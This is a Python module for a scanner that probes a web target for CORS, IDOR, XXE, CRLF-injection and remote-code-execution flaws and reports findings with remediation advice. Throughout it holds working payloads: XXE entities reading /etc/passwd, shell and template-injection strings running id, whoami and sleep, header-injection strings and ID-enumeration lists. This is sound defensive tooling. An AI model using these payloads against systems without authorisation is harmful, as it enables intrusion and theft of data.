"""
Vulnerability Scanners - Native BlackBox Implementation
========================================================

Implements missing vulnerability detection modules:
- CORS misconfiguration testing
- IDOR (Insecure Direct Object Reference) detection
- XXE (XML External Entity) injection testing
- CRLF injection detection
- RCE (Remote Code Execution) verification

Author: DeadManOfficial
Version: 1.0.0
License: For authorized security testing only
"""

import asyncio
import re
import json
import base64
import hashlib
import time
import random
import string
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple, Set
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
import aiohttp


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class VulnFinding:
    """Vulnerability finding result"""
    title: str
    severity: Severity
    category: str
    url: str
    description: str
    evidence: str = ""
    request: Optional[str] = None
    response: Optional[str] = None
    remediation: str = ""
    cwe: Optional[str] = None
    cvss: Optional[float] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "title": self.title,
            "severity": self.severity.value,
            "category": self.category,
            "url": self.url,
            "description": self.description,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cwe": self.cwe,
            "cvss": self.cvss
        }


# =============================================================================
# CORS MISCONFIGURATION SCANNER
# =============================================================================

class CORSScanner:
    """
    CORS Misconfiguration Scanner.

    Tests for:
    - Origin reflection (arbitrary origin accepted)
    - Null origin acceptance
    - Subdomain wildcard issues
    - Credentials with wildcard
    - Pre-flight bypass
    """

    MALICIOUS_ORIGINS = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://localhost",
        "https://127.0.0.1",
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.findings: List[VulnFinding] = []

    async def scan(self, url: str, session: Optional[aiohttp.ClientSession] = None) -> List[VulnFinding]:
        """Scan URL for CORS misconfigurations"""
        self.findings = []
        close_session = False

        if session is None:
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout))
            close_session = True

        try:
            parsed = urlparse(url)
            base_origin = f"{parsed.scheme}://{parsed.netloc}"

            # Test 1: Arbitrary origin reflection
            await self._test_origin_reflection(session, url)

            # Test 2: Null origin
            await self._test_null_origin(session, url)

            # Test 3: Subdomain bypass
            await self._test_subdomain_bypass(session, url, parsed.netloc)

            # Test 4: Credentials with wildcard
            await self._test_credentials_wildcard(session, url)

            # Test 5: Pre-flight bypass
            await self._test_preflight_bypass(session, url)

        finally:
            if close_session:
                await session.close()

        return self.findings

    async def _test_origin_reflection(self, session: aiohttp.ClientSession, url: str):
        """Test if arbitrary origins are reflected"""
        for origin in self.MALICIOUS_ORIGINS[:2]:
            try:
                headers = {"Origin": origin}
                async with session.get(url, headers=headers) as resp:
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                    if acao == origin:
                        severity = Severity.HIGH if acac.lower() == "true" else Severity.MEDIUM
                        self.findings.append(VulnFinding(
                            title="CORS Origin Reflection",
                            severity=severity,
                            category="cors",
                            url=url,
                            description=f"Server reflects arbitrary Origin header: {origin}",
                            evidence=f"ACAO: {acao}, ACAC: {acac}",
                            remediation="Implement strict origin whitelist validation",
                            cwe="CWE-942",
                            cvss=6.5 if acac.lower() == "true" else 4.3
                        ))
                        return
            except Exception:
                pass

    async def _test_null_origin(self, session: aiohttp.ClientSession, url: str):
        """Test if null origin is accepted"""
        try:
            headers = {"Origin": "null"}
            async with session.get(url, headers=headers) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                if acao == "null":
                    self.findings.append(VulnFinding(
                        title="CORS Null Origin Accepted",
                        severity=Severity.MEDIUM,
                        category="cors",
                        url=url,
                        description="Server accepts 'null' as a valid origin",
                        evidence=f"ACAO: {acao}",
                        remediation="Reject null origin in CORS configuration",
                        cwe="CWE-942",
                        cvss=5.3
                    ))
        except Exception:
            pass

    async def _test_subdomain_bypass(self, session: aiohttp.ClientSession, url: str, domain: str):
        """Test for subdomain wildcard issues"""
        # Try evil subdomain
        parts = domain.split(".")
        if len(parts) >= 2:
            evil_subdomain = f"evil.{'.'.join(parts[-2:])}"
            try:
                headers = {"Origin": f"https://{evil_subdomain}"}
                async with session.get(url, headers=headers) as resp:
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    if evil_subdomain in acao:
                        self.findings.append(VulnFinding(
                            title="CORS Subdomain Wildcard",
                            severity=Severity.MEDIUM,
                            category="cors",
                            url=url,
                            description=f"Server accepts arbitrary subdomains: {evil_subdomain}",
                            evidence=f"ACAO: {acao}",
                            remediation="Validate full origin, not just domain suffix",
                            cwe="CWE-942",
                            cvss=5.3
                        ))
            except Exception:
                pass

    async def _test_credentials_wildcard(self, session: aiohttp.ClientSession, url: str):
        """Test for credentials with wildcard origin"""
        try:
            headers = {"Origin": "https://evil.com"}
            async with session.get(url, headers=headers) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao == "*" and acac.lower() == "true":
                    self.findings.append(VulnFinding(
                        title="CORS Wildcard with Credentials",
                        severity=Severity.HIGH,
                        category="cors",
                        url=url,
                        description="Server allows credentials with wildcard origin (browser will block but indicates misconfiguration)",
                        evidence=f"ACAO: {acao}, ACAC: {acac}",
                        remediation="Never use wildcard with credentials",
                        cwe="CWE-942",
                        cvss=7.5
                    ))
        except Exception:
            pass

    async def _test_preflight_bypass(self, session: aiohttp.ClientSession, url: str):
        """Test for pre-flight bypass via method override"""
        try:
            headers = {
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "PUT",
                "Access-Control-Request-Headers": "X-Custom-Header"
            }
            async with session.options(url, headers=headers) as resp:
                acam = resp.headers.get("Access-Control-Allow-Methods", "")
                if "PUT" in acam or "DELETE" in acam or "*" in acam:
                    self.findings.append(VulnFinding(
                        title="CORS Permissive Methods",
                        severity=Severity.LOW,
                        category="cors",
                        url=url,
                        description=f"Server allows dangerous HTTP methods: {acam}",
                        evidence=f"ACAM: {acam}",
                        remediation="Restrict allowed methods to minimum required",
                        cwe="CWE-942",
                        cvss=3.7
                    ))
        except Exception:
            pass


# =============================================================================
# IDOR (Insecure Direct Object Reference) SCANNER
# =============================================================================

class IDORScanner:
    """
    IDOR Vulnerability Scanner.

    Tests for:
    - Horizontal privilege escalation (accessing other users' data)
    - Vertical privilege escalation (accessing admin resources)
    - UUID/GUID enumeration
    - Encoded ID manipulation
    - Parameter tampering
    """

    ID_PATTERNS = [
        r'[?&]id=(\d+)',
        r'[?&]user_id=(\d+)',
        r'[?&]account_id=(\d+)',
        r'[?&]order_id=(\d+)',
        r'[?&]doc_id=(\d+)',
        r'/users?/(\d+)',
        r'/accounts?/(\d+)',
        r'/orders?/(\d+)',
        r'/documents?/(\d+)',
        r'/api/v\d+/\w+/(\d+)',
        r'[?&]uuid=([a-f0-9-]{36})',
        r'/([a-f0-9-]{36})(?:/|$)',
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.findings: List[VulnFinding] = []

    async def scan(self, url: str, auth_headers: Dict[str, str] = None,
                   session: Optional[aiohttp.ClientSession] = None) -> List[VulnFinding]:
        """Scan URL for IDOR vulnerabilities"""
        self.findings = []
        close_session = False

        if session is None:
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout))
            close_session = True

        try:
            # Extract IDs from URL
            ids_found = self._extract_ids(url)

            for id_type, original_id, param_name in ids_found:
                # Generate test IDs
                test_ids = self._generate_test_ids(original_id, id_type)

                for test_id in test_ids:
                    modified_url = self._replace_id(url, original_id, test_id, param_name)
                    await self._test_idor(session, url, modified_url, original_id, test_id, auth_headers)

        finally:
            if close_session:
                await session.close()

        return self.findings

    def _extract_ids(self, url: str) -> List[Tuple[str, str, str]]:
        """Extract potential IDs from URL"""
        ids = []
        for pattern in self.ID_PATTERNS:
            matches = re.finditer(pattern, url, re.IGNORECASE)
            for match in matches:
                id_value = match.group(1)
                # Determine ID type
                if re.match(r'^[a-f0-9-]{36}$', id_value, re.IGNORECASE):
                    id_type = "uuid"
                elif id_value.isdigit():
                    id_type = "numeric"
                else:
                    id_type = "string"

                # Extract parameter name if in query string
                param_match = re.search(r'[?&](\w+)=' + re.escape(id_value), url)
                param_name = param_match.group(1) if param_match else None

                ids.append((id_type, id_value, param_name))
        return ids

    def _generate_test_ids(self, original_id: str, id_type: str) -> List[str]:
        """Generate test IDs based on original"""
        test_ids = []

        if id_type == "numeric":
            num = int(original_id)
            # Adjacent IDs
            test_ids.extend([str(num - 1), str(num + 1), str(num - 10), str(num + 10)])
            # Common admin IDs
            test_ids.extend(["1", "0", "2", "100", "1000"])
            # Negative
            test_ids.append("-1")

        elif id_type == "uuid":
            # Modify last character
            test_ids.append(original_id[:-1] + "0")
            test_ids.append(original_id[:-1] + "1")
            # Common test UUIDs
            test_ids.append("00000000-0000-0000-0000-000000000000")
            test_ids.append("00000000-0000-0000-0000-000000000001")

        else:
            # String manipulation
            test_ids.extend(["admin", "root", "1", "test"])

        return test_ids

    def _replace_id(self, url: str, original: str, new_id: str, param_name: str = None) -> str:
        """Replace ID in URL"""
        if param_name:
            return re.sub(f'{param_name}={re.escape(original)}', f'{param_name}={new_id}', url)
        return url.replace(original, new_id)

    async def _test_idor(self, session: aiohttp.ClientSession, original_url: str,
                         modified_url: str, original_id: str, test_id: str,
                         auth_headers: Dict[str, str] = None):
        """Test for IDOR by comparing responses"""
        headers = auth_headers or {}

        try:
            # Get original response
            async with session.get(original_url, headers=headers) as orig_resp:
                orig_status = orig_resp.status
                orig_body = await orig_resp.text()

            # Get modified response
            async with session.get(modified_url, headers=headers) as mod_resp:
                mod_status = mod_resp.status
                mod_body = await mod_resp.text()

            # Analyze responses
            if mod_status == 200 and orig_status == 200:
                # Check if we got different data (potential IDOR)
                if mod_body != orig_body and len(mod_body) > 100:
                    # Check for sensitive data indicators
                    sensitive_patterns = [
                        r'"email"\s*:\s*"[^"]+@[^"]+"',
                        r'"password"',
                        r'"ssn"',
                        r'"credit_card"',
                        r'"phone"\s*:\s*"[^"]+"',
                        r'"address"',
                        r'"user_?id"\s*:\s*["\d]',
                    ]

                    has_sensitive = any(re.search(p, mod_body, re.I) for p in sensitive_patterns)

                    if has_sensitive:
                        self.findings.append(VulnFinding(
                            title="IDOR - Unauthorized Data Access",
                            severity=Severity.HIGH,
                            category="idor",
                            url=modified_url,
                            description=f"Accessed data for ID {test_id} (original: {original_id})",
                            evidence=f"Modified ID from {original_id} to {test_id}, received different sensitive data",
                            remediation="Implement proper authorization checks on all object references",
                            cwe="CWE-639",
                            cvss=7.5
                        ))

            elif mod_status == 200 and orig_status in [403, 401]:
                # Potential vertical IDOR
                self.findings.append(VulnFinding(
                    title="IDOR - Potential Privilege Escalation",
                    severity=Severity.HIGH,
                    category="idor",
                    url=modified_url,
                    description=f"ID manipulation bypassed authorization (original: {orig_status}, modified: {mod_status})",
                    evidence=f"Original ID {original_id} returned {orig_status}, test ID {test_id} returned 200",
                    remediation="Implement consistent authorization across all ID values",
                    cwe="CWE-639",
                    cvss=8.1
                ))

        except Exception:
            pass


# =============================================================================
# XXE (XML External Entity) SCANNER
# =============================================================================

class XXEScanner:
    """
    XXE Vulnerability Scanner.

    Tests for:
    - Classic XXE (file disclosure)
    - Blind XXE (out-of-band)
    - XXE via DTD
    - XXE via XInclude
    - XXE via SVG/Office documents
    """

    XXE_PAYLOADS = {
        "classic_file": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',

        "classic_windows": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',

        "parameter_entity": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root><data>test</data></root>''',

        "xinclude": '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>''',

        "svg": '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text></svg>''',
    }

    # Patterns indicating successful XXE
    SUCCESS_PATTERNS = [
        r'root:.*:0:0:',  # /etc/passwd
        r'\[fonts\]',     # win.ini
        r'\[extensions\]',
        r'daemon:',
        r'nobody:',
    ]

    def __init__(self, timeout: int = 10, callback_url: str = None):
        self.timeout = timeout
        self.callback_url = callback_url  # For blind XXE
        self.findings: List[VulnFinding] = []

    async def scan(self, url: str, method: str = "POST",
                   content_type: str = "application/xml",
                   session: Optional[aiohttp.ClientSession] = None) -> List[VulnFinding]:
        """Scan endpoint for XXE vulnerabilities"""
        self.findings = []
        close_session = False

        if session is None:
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout))
            close_session = True

        try:
            for payload_name, payload in self.XXE_PAYLOADS.items():
                await self._test_xxe(session, url, method, content_type, payload_name, payload)

        finally:
            if close_session:
                await session.close()

        return self.findings

    async def _test_xxe(self, session: aiohttp.ClientSession, url: str,
                        method: str, content_type: str, payload_name: str, payload: str):
        """Test individual XXE payload"""
        headers = {"Content-Type": content_type}

        try:
            if method.upper() == "POST":
                async with session.post(url, data=payload, headers=headers) as resp:
                    body = await resp.text()
                    self._analyze_response(url, payload_name, payload, body)
            else:
                # For GET, try query parameter
                test_url = f"{url}?xml={quote(payload)}"
                async with session.get(test_url, headers=headers) as resp:
                    body = await resp.text()
                    self._analyze_response(url, payload_name, payload, body)

        except Exception:
            pass

    def _analyze_response(self, url: str, payload_name: str, payload: str, response: str):
        """Analyze response for XXE indicators"""
        for pattern in self.SUCCESS_PATTERNS:
            if re.search(pattern, response):
                self.findings.append(VulnFinding(
                    title=f"XXE Vulnerability ({payload_name})",
                    severity=Severity.CRITICAL,
                    category="xxe",
                    url=url,
                    description=f"XML External Entity injection successful using {payload_name} technique",
                    evidence=f"Response contains sensitive file content: {pattern}",
                    request=payload[:500],
                    response=response[:1000],
                    remediation="Disable DTD processing, use defused XML parsers",
                    cwe="CWE-611",
                    cvss=9.1
                ))
                return

        # Check for error-based XXE
        error_patterns = [
            r'failed to load external entity',
            r'xmlParseEntityRef',
            r'DOCTYPE.*not allowed',
            r'SYSTEM.*not supported',
        ]
        for pattern in error_patterns:
            if re.search(pattern, response, re.I):
                self.findings.append(VulnFinding(
                    title=f"Potential XXE (Error-Based)",
                    severity=Severity.MEDIUM,
                    category="xxe",
                    url=url,
                    description="XML parser error suggests XXE may be possible with different payload",
                    evidence=f"Error pattern found: {pattern}",
                    remediation="Disable DTD processing completely",
                    cwe="CWE-611",
                    cvss=5.3
                ))
                return


# =============================================================================
# CRLF INJECTION SCANNER
# =============================================================================

class CRLFScanner:
    """
    CRLF Injection Scanner.

    Tests for:
    - HTTP Response Splitting
    - Header Injection
    - Log Injection
    - Various encoding bypasses
    """

    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0d%0aX-Injected:header",
        "%0a%0dSet-Cookie:crlf=injection",
        "\r\nSet-Cookie:crlf=injection",
        "\r\nX-Injected:header",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",  # Unicode bypass
        "%0d%0a%0d%0a<html>injected</html>",  # Body injection
        "%%0d%%0aSet-Cookie:crlf=injection",  # Double encoding
        "%25%30%64%25%30%61Set-Cookie:crlf=injection",  # Triple encoding
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.findings: List[VulnFinding] = []

    async def scan(self, url: str, params: List[str] = None,
                   session: Optional[aiohttp.ClientSession] = None) -> List[VulnFinding]:
        """Scan URL for CRLF injection"""
        self.findings = []
        close_session = False

        if session is None:
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout))
            close_session = True

        try:
            # If no params specified, try common ones
            if not params:
                params = self._extract_params(url)
                params.extend(["url", "redirect", "next", "return", "goto", "dest", "callback"])

            for param in set(params):
                for payload in self.CRLF_PAYLOADS:
                    await self._test_crlf(session, url, param, payload)

        finally:
            if close_session:
                await session.close()

        return self.findings

    def _extract_params(self, url: str) -> List[str]:
        """Extract parameter names from URL"""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())
        return params

    async def _test_crlf(self, session: aiohttp.ClientSession, url: str,
                         param: str, payload: str):
        """Test individual CRLF payload"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]

        new_query = urlencode(query, doseq=True)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

        try:
            async with session.get(test_url, allow_redirects=False) as resp:
                # Check for injected headers
                headers = dict(resp.headers)

                if "Set-Cookie" in headers and "crlf=injection" in headers.get("Set-Cookie", ""):
                    self.findings.append(VulnFinding(
                        title="CRLF Injection - Header Injection",
                        severity=Severity.HIGH,
                        category="crlf",
                        url=test_url,
                        description=f"CRLF injection via parameter '{param}' allows header injection",
                        evidence=f"Injected header: Set-Cookie: crlf=injection",
                        remediation="Sanitize all user input, reject CRLF characters",
                        cwe="CWE-113",
                        cvss=6.1
                    ))
                    return

                if "X-Injected" in headers:
                    self.findings.append(VulnFinding(
                        title="CRLF Injection - Custom Header",
                        severity=Severity.HIGH,
                        category="crlf",
                        url=test_url,
                        description=f"CRLF injection via parameter '{param}' allows arbitrary header injection",
                        evidence=f"Injected header: X-Injected",
                        remediation="Sanitize all user input, reject CRLF characters",
                        cwe="CWE-113",
                        cvss=6.1
                    ))
                    return

                # Check response body for injection
                body = await resp.text()
                if "<html>injected</html>" in body:
                    self.findings.append(VulnFinding(
                        title="CRLF Injection - Response Splitting",
                        severity=Severity.CRITICAL,
                        category="crlf",
                        url=test_url,
                        description=f"CRLF injection via parameter '{param}' allows HTTP response splitting",
                        evidence="Injected HTML content in response body",
                        remediation="Sanitize all user input, reject CRLF characters",
                        cwe="CWE-113",
                        cvss=8.1
                    ))

        except Exception:
            pass


# =============================================================================
# RCE (Remote Code Execution) SCANNER
# =============================================================================

class RCEScanner:
    """
    RCE Vulnerability Scanner.

    Tests for:
    - Command injection
    - Code injection (PHP, Python, Ruby, Node)
    - Template injection (SSTI)
    - Deserialization
    - Expression language injection
    """

    # Time-based payloads (safer for detection)
    TIME_PAYLOADS = {
        "bash_sleep": [
            "; sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "&& sleep 5",
            "$(sleep 5)",
            "`sleep 5`",
            "%0asleep 5",
        ],
        "windows_ping": [
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "|| ping -n 5 127.0.0.1",
        ],
        "php": [
            "<?php sleep(5); ?>",
            "${sleep(5)}",
        ],
        "python": [
            "__import__('time').sleep(5)",
            "{{config.__class__.__init__.__globals__['os'].system('sleep 5')}}",
        ],
        "node": [
            "require('child_process').execSync('sleep 5')",
        ],
    }

    # Output-based payloads (for detection without time)
    OUTPUT_PAYLOADS = {
        "bash_id": [
            "; id",
            "| id",
            "$(id)",
            "`id`",
        ],
        "bash_whoami": [
            "; whoami",
            "| whoami",
            "$(whoami)",
        ],
        "windows": [
            "& whoami",
            "| whoami",
        ],
    }

    # Success patterns
    SUCCESS_PATTERNS = [
        r'uid=\d+\(\w+\)',  # id command
        r'root|www-data|apache|nginx|node',  # whoami
        r'NT AUTHORITY',  # Windows
        r'COMPUTERNAME=',
    ]

    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.findings: List[VulnFinding] = []

    async def scan(self, url: str, params: List[str] = None,
                   method: str = "GET",
                   session: Optional[aiohttp.ClientSession] = None) -> List[VulnFinding]:
        """Scan for RCE vulnerabilities"""
        self.findings = []
        close_session = False

        if session is None:
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout))
            close_session = True

        try:
            # Extract or use provided params
            if not params:
                params = self._extract_params(url)
                params.extend(["cmd", "exec", "command", "run", "ping", "query", "code"])

            for param in set(params):
                # Test time-based first (safer)
                await self._test_time_based(session, url, param, method)

                # Test output-based
                await self._test_output_based(session, url, param, method)

        finally:
            if close_session:
                await session.close()

        return self.findings

    def _extract_params(self, url: str) -> List[str]:
        """Extract parameter names from URL"""
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())

    async def _test_time_based(self, session: aiohttp.ClientSession, url: str,
                                param: str, method: str):
        """Test time-based RCE detection"""
        # First, get baseline response time
        try:
            start = time.time()
            parsed = urlparse(url)
            if method.upper() == "GET":
                async with session.get(url) as resp:
                    await resp.text()
            baseline = time.time() - start
        except Exception:
            baseline = 1.0

        # Test time-based payloads
        for category, payloads in self.TIME_PAYLOADS.items():
            for payload in payloads[:3]:  # Limit per category
                try:
                    test_url = self._inject_param(url, param, payload)

                    start = time.time()
                    if method.upper() == "GET":
                        async with session.get(test_url) as resp:
                            await resp.text()
                    else:
                        async with session.post(url, data={param: payload}) as resp:
                            await resp.text()
                    elapsed = time.time() - start

                    # If response took significantly longer (4+ seconds more than baseline)
                    if elapsed > baseline + 4:
                        self.findings.append(VulnFinding(
                            title=f"RCE - {category} (Time-Based)",
                            severity=Severity.CRITICAL,
                            category="rce",
                            url=test_url,
                            description=f"Command injection via parameter '{param}' using {category} payload",
                            evidence=f"Baseline: {baseline:.2f}s, Payload response: {elapsed:.2f}s (delayed ~5s)",
                            remediation="Never pass user input to system commands, use allowlists",
                            cwe="CWE-78",
                            cvss=9.8
                        ))
                        return

                except asyncio.TimeoutError:
                    # Timeout might indicate successful sleep
                    self.findings.append(VulnFinding(
                        title=f"Potential RCE - {category} (Timeout)",
                        severity=Severity.HIGH,
                        category="rce",
                        url=url,
                        description=f"Request timed out with sleep payload, possible command injection",
                        evidence=f"Parameter: {param}, Payload caused timeout",
                        remediation="Never pass user input to system commands",
                        cwe="CWE-78",
                        cvss=8.1
                    ))
                except Exception:
                    pass

    async def _test_output_based(self, session: aiohttp.ClientSession, url: str,
                                  param: str, method: str):
        """Test output-based RCE detection"""
        for category, payloads in self.OUTPUT_PAYLOADS.items():
            for payload in payloads[:2]:
                try:
                    test_url = self._inject_param(url, param, payload)

                    if method.upper() == "GET":
                        async with session.get(test_url) as resp:
                            body = await resp.text()
                    else:
                        async with session.post(url, data={param: payload}) as resp:
                            body = await resp.text()

                    # Check for command output
                    for pattern in self.SUCCESS_PATTERNS:
                        if re.search(pattern, body, re.I):
                            self.findings.append(VulnFinding(
                                title=f"RCE - {category} (Output-Based)",
                                severity=Severity.CRITICAL,
                                category="rce",
                                url=test_url,
                                description=f"Command injection via parameter '{param}' - command output visible",
                                evidence=f"Output contains: {pattern}",
                                response=body[:500],
                                remediation="Never pass user input to system commands",
                                cwe="CWE-78",
                                cvss=9.8
                            ))
                            return

                except Exception:
                    pass

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = urlencode(query, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"


# =============================================================================
# UNIFIED VULNERABILITY SCANNER
# =============================================================================

class UnifiedVulnScanner:
    """
    Unified vulnerability scanner combining all modules.
    """

    def __init__(self, timeout: int = 10, callback_url: str = None):
        self.cors = CORSScanner(timeout)
        self.idor = IDORScanner(timeout)
        self.xxe = XXEScanner(timeout, callback_url)
        self.crlf = CRLFScanner(timeout)
        self.rce = RCEScanner(timeout)

    async def scan_all(self, url: str, auth_headers: Dict[str, str] = None,
                       session: Optional[aiohttp.ClientSession] = None) -> Dict[str, List[VulnFinding]]:
        """Run all vulnerability scans"""
        close_session = False
        if session is None:
            session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
            close_session = True

        results = {
            "cors": [],
            "idor": [],
            "xxe": [],
            "crlf": [],
            "rce": [],
        }

        try:
            # Run scans concurrently
            cors_task = self.cors.scan(url, session)
            idor_task = self.idor.scan(url, auth_headers, session)
            crlf_task = self.crlf.scan(url, session=session)
            rce_task = self.rce.scan(url, session=session)

            cors_results, idor_results, crlf_results, rce_results = await asyncio.gather(
                cors_task, idor_task, crlf_task, rce_task,
                return_exceptions=True
            )

            if not isinstance(cors_results, Exception):
                results["cors"] = cors_results
            if not isinstance(idor_results, Exception):
                results["idor"] = idor_results
            if not isinstance(crlf_results, Exception):
                results["crlf"] = crlf_results
            if not isinstance(rce_results, Exception):
                results["rce"] = rce_results

        finally:
            if close_session:
                await session.close()

        return results

    def get_all_findings(self) -> List[VulnFinding]:
        """Get all findings from all scanners"""
        findings = []
        findings.extend(self.cors.findings)
        findings.extend(self.idor.findings)
        findings.extend(self.xxe.findings)
        findings.extend(self.crlf.findings)
        findings.extend(self.rce.findings)
        return findings


# =============================================================================
# EXPORTS
# =============================================================================

__all__ = [
    'Severity',
    'VulnFinding',
    'CORSScanner',
    'IDORScanner',
    'XXEScanner',
    'CRLFScanner',
    'RCEScanner',
    'UnifiedVulnScanner',
]
